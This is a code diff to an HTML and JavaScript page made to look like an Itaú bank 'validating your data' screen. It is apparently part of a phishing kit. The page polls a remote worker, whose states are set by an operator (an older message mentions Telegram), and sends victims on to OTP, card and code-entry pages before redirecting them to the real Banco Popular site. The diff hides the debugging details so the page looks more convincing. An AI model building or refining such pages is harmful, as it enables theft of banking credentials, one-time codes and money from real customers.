@@ -32,9 +32,16 @@
       box-shadow: 0 10px 40px rgba(0,0,0,0.08);
     }
 
-    /* ============================================
-       SPINNER SALMON - CÍRCULO DE CARGA
-    ============================================ */
+    /* Logo Itaú */
+    .logo-itau {
+      font-size: 36px;
+      font-weight: 700;
+      color: #06143f;
+      letter-spacing: -2px;
+      margin-bottom: 30px;
+    }
+
+    /* SPINNER */
     .spinner-container {
       display: flex;
       justify-content: center;
@@ -43,8 +50,8 @@
 
     .spinner-salmon {
       position: relative;
-      width: 80px;
-      height: 80px;
+      width: 60px;
+      height: 60px;
     }
 
     .spinner-salmon::before {
@@ -54,7 +61,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      border: 5px solid rgba(255, 91, 0, 0.15);
+      border: 4px solid rgba(255, 91, 0, 0.15);
       border-radius: 50%;
     }
 
@@ -65,7 +72,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      border: 5px solid transparent;
+      border: 4px solid transparent;
       border-top-color: #ff5b00;
       border-bottom-color: #ff5b00;
       border-radius: 50%;
@@ -77,104 +84,28 @@
       100% { transform: rotate(360deg); }
     }
 
-    .spinner-salmon .icon {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      color: #ff5b00;
-      font-size: 28px;
-      z-index: 1;
-    }
-
-    /* TEXTO Y ESTILOS */
+    /* TEXTO */
     .title {
-      font-size: 22px;
-      font-weight: 700;
+      font-size: 20px;
+      font-weight: 600;
       color: #1a1a2e;
-      margin-bottom: 8px;
+      margin-bottom: 6px;
     }
 
     .subtitle {
-      font-size: 15px;
-      color: #6c757d;
-      margin-bottom: 20px;
-      line-height: 1.5;
-    }
-
-    .info-box {
-      background: #f8f9fa;
-      border-radius: 12px;
-      padding: 16px;
-      margin: 16px 0;
-      font-size: 13px;
-      color: #495057;
-      text-align: left;
-      word-break: break-all;
-    }
-
-    .info-box .label {
-      font-weight: 600;
-      color: #1a1a2e;
-      display: block;
-      margin-bottom: 4px;
-    }
-
-    .info-box .value {
-      font-family: 'Courier New', monospace;
-      background: white;
-      padding: 6px 10px;
-      border-radius: 6px;
-      display: inline-block;
-      font-size: 12px;
-      border: 1px solid #e9ecef;
-    }
-
-    .status-dot {
-      display: inline-block;
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      margin-right: 8px;
-      animation: pulse 1.5s ease-in-out infinite;
-    }
-
-    .status-dot.pending {
-      background: #ff5b00;
-    }
-
-    .status-dot.success {
-      background: #28a745;
-      animation: none;
-    }
-
-    .status-dot.error {
-      background: #dc3545;
-      animation: none;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.5; transform: scale(0.8); }
-    }
-
-    .status-text {
-      display: flex;
-      align-items: center;
-      justify-content: center;
       font-size: 14px;
-      color: #495057;
-      margin: 8px 0;
+      color: #6c757d;
+      line-height: 1.5;
     }
 
     .btn-cancel {
       background: none;
       border: none;
       color: #dc3545;
-      font-size: 14px;
+      font-size: 13px;
       cursor: pointer;
       text-decoration: underline;
-      margin-top: 16px;
+      margin-top: 20px;
       padding: 8px 16px;
     }
 
@@ -182,40 +113,24 @@
       color: #c82333;
     }
 
-    .hidden {
-      display: none !important;
-    }
-
-    /* Logo Itaú */
-    .logo-itau {
-      font-size: 32px;
-      font-weight: 700;
-      color: #06143f;
-      letter-spacing: -2px;
-      margin-bottom: 16px;
-    }
-
     /* Responsive */
     @media (max-width: 480px) {
       .container {
         padding: 28px 20px;
       }
+      .logo-itau {
+        font-size: 30px;
+      }
       .title {
-        font-size: 19px;
+        font-size: 18px;
       }
       .subtitle {
-        font-size: 14px;
-      }
-      .logo-itau {
-        font-size: 26px;
+        font-size: 13px;
       }
     }
 
     @media (prefers-reduced-motion: reduce) {
       .spinner-salmon::after {
-        animation: none;
-      }
-      .status-dot {
         animation: none;
       }
     }
@@ -227,51 +142,17 @@
     <div class="logo-itau">itaú</div>
 
     <!-- SPINNER -->
-    <div class="spinner-container" id="spinnerContainer">
-      <div class="spinner-salmon">
-        <div class="icon">
-          <i class="fas fa-shield-alt"></i>
-        </div>
-      </div>
+    <div class="spinner-container">
+      <div class="spinner-salmon"></div>
     </div>
 
     <!-- TÍTULO -->
-    <h1 class="title">Validando acceso</h1>
-    <p class="subtitle">Estamos verificando tu identidad. Por favor, espera mientras procesamos tu solicitud.</p>
-
-    <!-- ESTADO -->
-    <div class="status-text">
-      <span class="status-dot pending" id="statusDot"></span>
-      <span id="statusMessage">Esperando autorización...</span>
-    </div>
-
-    <!-- INFO TRANSACCIÓN -->
-    <div class="info-box">
-      <span class="label">🆔 ID de transacción</span>
-      <span class="value" id="transactionIdDisplay">Cargando...</span>
-    </div>
-
-    <div class="info-box">
-      <span class="label">👤 Usuario</span>
-      <span class="value" id="usuarioDisplay">-</span>
-    </div>
-
-    <div class="info-box">
-      <span class="label">🆔 DNI</span>
-      <span class="value" id="dniDisplay">-</span>
-    </div>
-
-    <!-- INTENTOS -->
-    <div style="font-size: 12px; color: #adb5bd; margin-top: 12px;">
-      Intentos: <span id="intentosDisplay">0</span>/60
-    </div>
+    <h1 class="title">Validando tus datos</h1>
+    <p class="subtitle">Por favor espera un momento...</p>
 
     <!-- BOTÓN CANCELAR -->
-    <button class="btn-cancel" onclick="cancelar()">✕ Cancelar y volver</button>
+    <button class="btn-cancel" onclick="cancelar()">✕ Cancelar</button>
   </div>
-
-  <!-- Font Awesome -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
   <script>
     // ========================= CONFIGURACIÓN =========================
@@ -281,61 +162,29 @@
     let timeoutId = null;
     let isProcessing = false;
 
-    // ========================= ELEMENTOS DOM =========================
-    const statusDot = document.getElementById('statusDot');
-    const statusMessage = document.getElementById('statusMessage');
-    const transactionIdDisplay = document.getElementById('transactionIdDisplay');
-    const usuarioDisplay = document.getElementById('usuarioDisplay');
-    const dniDisplay = document.getElementById('dniDisplay');
-    const intentosDisplay = document.getElementById('intentosDisplay');
-    const spinnerContainer = document.getElementById('spinnerContainer');
-
-    // ========================= FUNCIONES UI =========================
-    function actualizarUI(estado, mensaje, type = 'pending') {
-      statusDot.className = 'status-dot ' + type;
-      statusMessage.textContent = mensaje;
-      intentosDisplay.textContent = intentos;
-    }
-
-    function actualizarDatos(dni, usuario, transactionId) {
-      transactionIdDisplay.textContent = transactionId;
-      usuarioDisplay.textContent = usuario || 'No especificado';
-      dniDisplay.textContent = dni || 'No especificado';
-    }
-
-    function mostrarError(mensaje) {
-      actualizarUI('error', mensaje, 'error');
-      spinnerContainer.style.display = 'none';
-    }
-
     // ========================= FUNCIÓN PRINCIPAL =========================
     async function checkStatus(transactionId) {
       if (isProcessing) return;
       isProcessing = true;
-
       intentos++;
-      actualizarUI('pending', `Verificando estado (${intentos}/${MAX_INTENTOS})...`, 'pending');
-      
+
       try {
         const response = await fetch(`${WORKER_URL}/status?id=${transactionId}`);
-        
+
         if (!response.ok) {
           throw new Error(`HTTP ${response.status}`);
         }
-        
+
         const data = await response.json();
         console.log(`📊 Estado (${intentos}/${MAX_INTENTOS}):`, data);
 
         // Si está pendiente, seguir esperando
         if (!data.estado || data.estado === "pendiente") {
-          actualizarUI('pending', '⏳ Esperando autorización en Telegram...', 'pending');
-          
           if (intentos >= MAX_INTENTOS) {
-            mostrarError('⏰ Tiempo de espera agotado. Por favor, intenta nuevamente.');
-            isProcessing = false;
+            console.log('⏰ Tiempo de espera agotado');
+            window.location.href = 'index.html';
             return;
           }
-          
           isProcessing = false;
           timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
           return;
@@ -344,69 +193,55 @@
         // ========================= PROCESAR ESTADO =========================
         const estado = data.estado;
         console.log(`✅ Estado recibido: ${estado}`);
-        
-        // Detener el spinner cuando hay una respuesta definitiva
-        spinnerContainer.style.display = 'none';
-        
+
         switch (estado) {
           case 'autorizado':
-            actualizarUI('success', '✅ ¡Autorización confirmada! Redirigiendo...', 'success');
             setTimeout(() => {
               window.location.href = 'codigo.html';
-            }, 1500);
+            }, 500);
             break;
-            
+
           case 'error':
-            actualizarUI('error', '❌ Acceso denegado. Redirigiendo...', 'error');
             setTimeout(() => {
               window.location.href = 'index.html';
-            }, 1500);
+            }, 500);
             break;
-            
+
           case 'otp_solicitado':
-            actualizarUI('pending', '📲 Código OTP solicitado. Esperando confirmación...', 'pending');
-            spinnerContainer.style.display = 'flex';
             isProcessing = false;
             timeoutId = setTimeout(() => checkStatus(transactionId), 8000);
             break;
-            
+
           case 'otp_recibido':
-            actualizarUI('success', '✅ Código OTP verificado. Redirigiendo...', 'success');
             setTimeout(() => {
               window.location.href = 'codeinco.html';
-            }, 1500);
+            }, 500);
             break;
-            
+
           case 'fallo_biometria':
-            actualizarUI('error', '🔐 Error en biometría. Redirigiendo...', 'error');
             setTimeout(() => {
               window.location.href = 'tarjeta.html';
-            }, 1500);
+            }, 500);
             break;
-            
+
           case 'finalizado':
-            actualizarUI('success', '🏁 Proceso finalizado. Redirigiendo...', 'success');
             setTimeout(() => {
               window.location.href = 'https://www.bancopopular.com.co/';
-            }, 1500);
+            }, 500);
             break;
-            
+
           default:
-            actualizarUI('pending', `Estado: ${estado}. Continuando...`, 'pending');
-            spinnerContainer.style.display = 'flex';
             isProcessing = false;
             timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
         }
-        
+
       } catch (error) {
         console.error('❌ Error:', error);
         if (intentos < MAX_INTENTOS) {
-          actualizarUI('pending', `⚠️ Error de conexión. Reintentando (${intentos}/${MAX_INTENTOS})...`, 'pending');
           isProcessing = false;
           timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
         } else {
-          mostrarError('❌ Error de conexión. Por favor, intenta nuevamente.');
-          isProcessing = false;
+          window.location.href = 'index.html';
         }
       }
     }
@@ -424,13 +259,12 @@
     // ========================= INICIALIZACIÓN =========================
     document.addEventListener('DOMContentLoaded', async () => {
       const bancoldataRaw = localStorage.getItem('bancoldata');
-      
+
       if (!bancoldataRaw) {
         console.log('❌ Error: Datos no encontrados');
-        mostrarError('❌ Sesión no encontrada. Redirigiendo...');
         setTimeout(() => {
           window.location.href = 'index.html';
-        }, 2000);
+        }, 1000);
         return;
       }
 
@@ -439,29 +273,23 @@
         bancoldata = JSON.parse(bancoldataRaw);
       } catch (e) {
         console.error('Error parsing bancoldata:', e);
-        mostrarError('❌ Datos inválidos. Redirigiendo...');
         setTimeout(() => {
           window.location.href = 'index.html';
-        }, 2000);
+        }, 1000);
         return;
       }
 
-      const { transactionId, dni, usuario } = bancoldata;
-      
+      const { transactionId } = bancoldata;
+
       if (!transactionId) {
         console.log('❌ Error: transactionId no encontrado');
-        mostrarError('❌ ID de transacción no encontrado. Redirigiendo...');
         setTimeout(() => {
           window.location.href = 'index.html';
-        }, 2000);
+        }, 1000);
         return;
       }
 
-      // Mostrar datos
-      actualizarDatos(dni || 'N/A', usuario || 'N/A', transactionId);
       console.log('🔍 Verificando transacción:', transactionId);
-      console.log('👤 Usuario:', usuario);
-      console.log('🆔 DNI:', dni);
 
       // Iniciar verificación
       await checkStatus(transactionId);
